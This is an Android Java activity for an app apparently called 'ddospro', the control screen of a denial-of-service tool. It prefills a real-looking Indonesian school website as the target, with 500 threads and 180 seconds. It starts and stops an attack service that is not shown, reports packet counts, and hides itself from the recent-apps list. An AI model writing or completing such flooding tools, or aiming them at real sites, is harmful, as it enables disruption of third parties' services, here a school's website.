package com.mzkyzak.ddospro;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

public class MainActivity extends AppCompatActivity {
    private EditText etTarget, etThreads, etDuration;
    private Button btnStart, btnStop;
    private TextView tvStatus, tvStats, tvMethod;
    private final Handler handler = new Handler(Looper.getMainLooper());
    private boolean isRunning = false;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            android.app.ActivityManager am = (android.app.ActivityManager) getSystemService(ACTIVITY_SERVICE);
            if (am != null && am.getAppTasks() != null && !am.getAppTasks().isEmpty()) {
                am.getAppTasks().get(0).setExcludeFromRecents(true);
            }
        }

        getWindow().addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);

        etTarget = findViewById(R.id.etTarget);
        etThreads = findViewById(R.id.etThreads);
        etDuration = findViewById(R.id.etDuration);
        btnStart = findViewById(R.id.btnStart);
        btnStop = findViewById(R.id.btnStop);
        tvStatus = findViewById(R.id.tvStatus);
        tvStats = findViewById(R.id.tvStats);
        tvMethod = findViewById(R.id.tvMethod);

        etTarget.setText("https://smpn23jakarta.sch.id");
        etThreads.setText("500");
        etDuration.setText("180");

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS)
                    != PackageManager.PERMISSION_GRANTED) {
                ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.POST_NOTIFICATIONS}, 101);
            }
        }

        btnStart.setOnClickListener(v -> startAttack());
        btnStop.setOnClickListener(v -> stopAttack());
    }

    private void startAttack() {
        if (isRunning) return;

        String target = etTarget.getText().toString().trim();
        if (target.isEmpty()) {
            Toast.makeText(this, "Masukkan target!", Toast.LENGTH_SHORT).show();
            return;
        }

        int threads = Integer.parseInt(etThreads.getText().toString());
        int duration = Integer.parseInt(etDuration.getText().toString());

        Intent intent = new Intent(this, AttackService.class);
        intent.putExtra("target", target);
        intent.putExtra("threads", threads);
        intent.putExtra("duration", duration);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent);
        } else {
            startService(intent);
        }

        isRunning = true;
        tvStatus.setText("🟢 SERANGAN AKTIF");
        tvStatus.setTextColor(0xFF00FF00);
        btnStart.setEnabled(false);
        btnStop.setEnabled(true);

        handler.postDelayed(updateStats, 1000);
    }

    private void stopAttack() {
        if (!isRunning) return;

        Intent intent = new Intent(this, AttackService.class);
        stopService(intent);

        isRunning = false;
        tvStatus.setText("🔴 BERHENTI");
        tvStatus.setTextColor(0xFFFF0000);
        btnStart.setEnabled(true);
        btnStop.setEnabled(false);
        handler.removeCallbacks(updateStats);
    }

    private final Runnable updateStats = new Runnable() {
        @Override
        public void run() {
            if (!isRunning) return;
            tvStats.setText("📡 Paket: " + AttackService.packetCount);
            tvMethod.setText("⚡ Speed: " + AttackService.packetPerSecond + "/s");
            handler.postDelayed(this, 1000);
        }
    };

    @Override
    protected void onDestroy() {
        super.onDestroy();
        stopAttack();
    }
}